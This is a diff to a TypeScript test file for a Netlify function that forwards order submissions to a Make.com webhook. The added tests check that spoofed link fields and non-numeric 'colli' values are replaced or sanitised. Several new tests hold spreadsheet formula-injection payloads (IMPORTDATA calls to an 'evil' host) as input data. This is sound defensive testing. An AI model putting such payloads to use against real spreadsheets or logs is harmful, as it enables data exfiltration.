@@ -9,6 +9,9 @@ const MAKE_URL = 'https://hook.eu2.make.com/geheim-token-123'
 const CODE = 'abcdEFGH1234_-xy'
 const payload = (over: Record<string, unknown> = {}) => JSON.stringify({ submission_id: CODE, ...over })
 
+const LINKS = { print_url: `https://app.example/?s=${CODE}`, fotos_url: `https://app.example/?fotos=${CODE}` }
+const doorgestuurdBody = () => JSON.parse((vi.mocked(fetch).mock.calls[0][1] as RequestInit).body as string)
+
 const post = (body: string, method = 'POST') =>
   new Request('https://app.example/.netlify/functions/naar-make', {
     method,
@@ -64,9 +67,9 @@ describe('naar-make', () => {
     const rest = {
       submission_id: CODE,
       entries: [
-        { entry_number: 1, recipient: 'Jansen', shelf: 'Schap 3', photos: [{ filename: 'a.jpg', base64: 'data:image/jpeg;base64,AA' }] },
-        { entry_number: 2, recipient: 'Zonder', shelf: 'Schap 4', photos: [] },
-        { entry_number: 3, recipient: 'Piet', shelf: 'Overig: x', photos: [{ filename: 'b.jpg', base64: 'data:image/jpeg;base64,BB' }] },
+        { entry_number: 1, colli: 1, recipient: 'Jansen', shelf: 'Schap 3', photos: [{ filename: 'a.jpg', base64: 'data:image/jpeg;base64,AA' }] },
+        { entry_number: 2, colli: 2, recipient: 'Zonder', shelf: 'Schap 4', photos: [] },
+        { entry_number: 3, colli: 1, recipient: 'Piet', shelf: 'Overig: x', photos: [{ filename: 'b.jpg', base64: 'data:image/jpeg;base64,BB' }] },
       ],
     }
     const res = await naarMake(post(JSON.stringify({ ...rest, labels })))
@@ -82,15 +85,37 @@ describe('naar-make', () => {
     expect(opgeslagen[`${CODE}/fotos/3`]).toMatchObject({ naam: 'Piet', schap: 'Overig: x' })
 
     const doorgestuurd = JSON.parse((vi.mocked(fetch).mock.calls[0][1] as RequestInit).body as string)
-    expect(doorgestuurd).toEqual(rest)
+    expect(doorgestuurd).toEqual({ ...rest, ...LINKS })
     expect(doorgestuurd).not.toHaveProperty('labels')
   })
 
   it('werkt zonder labels (oude client): geen labels opgeslagen, wel doorgestuurd', async () => {
-    const body = payload({ entries: [] })
-    expect((await naarMake(post(body))).status).toBe(200)
+    expect((await naarMake(post(payload({ entries: [] })))).status).toBe(200)
     expect(blobs.setJSON).not.toHaveBeenCalled()
-    expect((vi.mocked(fetch).mock.calls[0][1] as RequestInit).body).toBe(body)
+    expect(doorgestuurdBody()).toEqual({ submission_id: CODE, entries: [], ...LINKS })
+  })
+
+  it('vervangt print_url en fotos_url van de browser door eigen links (geen formule-injectie)', async () => {
+    const kwaad = { print_url: 'x"),IMPORTDATA("https://evil', fotos_url: 'https://evil.example/?fotos=1' }
+    expect((await naarMake(post(payload(kwaad)))).status).toBe(200)
+    const d = doorgestuurdBody()
+    expect(d.print_url).toBe(`https://app.example/?s=${CODE}`)
+    expect(d.fotos_url).toBe(`https://app.example/?fotos=${CODE}`)
+    expect(JSON.stringify(d)).not.toContain('evil')
+  })
+
+  it('maakt van colli altijd een getal (gaat ongeformatteerd het orderlog in)', async () => {
+    const entries = [{ entry_number: 1, colli: '=IMPORTDATA("https://evil")' }, { entry_number: 2, colli: 3 }]
+    expect((await naarMake(post(payload({ entries })))).status).toBe(200)
+    expect(doorgestuurdBody().entries.map((e: { colli: unknown }) => e.colli)).toEqual([1, 3])
+  })
+
+  it('neemt de origin van de request voor de links', async () => {
+    const req = new Request('https://deploy-preview-7--site.netlify.app/.netlify/functions/naar-make', { method: 'POST', body: payload() })
+    await naarMake(req)
+    const d = doorgestuurdBody()
+    expect(d.print_url).toBe(`https://deploy-preview-7--site.netlify.app/?s=${CODE}`)
+    expect(d.fotos_url).toBe(`https://deploy-preview-7--site.netlify.app/?fotos=${CODE}`)
   })
 
   it('slaat ongeldige labels niet op maar gaat wel door', async () => {
@@ -106,14 +131,14 @@ describe('naar-make', () => {
     expect(fetch).not.toHaveBeenCalled()
   })
 
-  it('stuurt de body zonder labels byte-identiek door en geeft 200', async () => {
+  it('stuurt de overige velden ongewijzigd door en geeft 200', async () => {
     const body = `{ "submission_id" : "${CODE}",  "naam":"Müller" }`
     const res = await naarMake(post(body))
     expect(res.status).toBe(200)
     expect(await res.json()).toEqual({ ok: true })
     const [url, init] = vi.mocked(fetch).mock.calls[0]
     expect(url).toBe(MAKE_URL)
-    expect((init as RequestInit).body).toBe(body)
+    expect(JSON.parse((init as RequestInit).body as string)).toEqual({ submission_id: CODE, naam: 'Müller', ...LINKS })
     expect((init as RequestInit).method).toBe('POST')
     expect((init as RequestInit).headers).toEqual({ 'Content-Type': 'application/json' })
   })
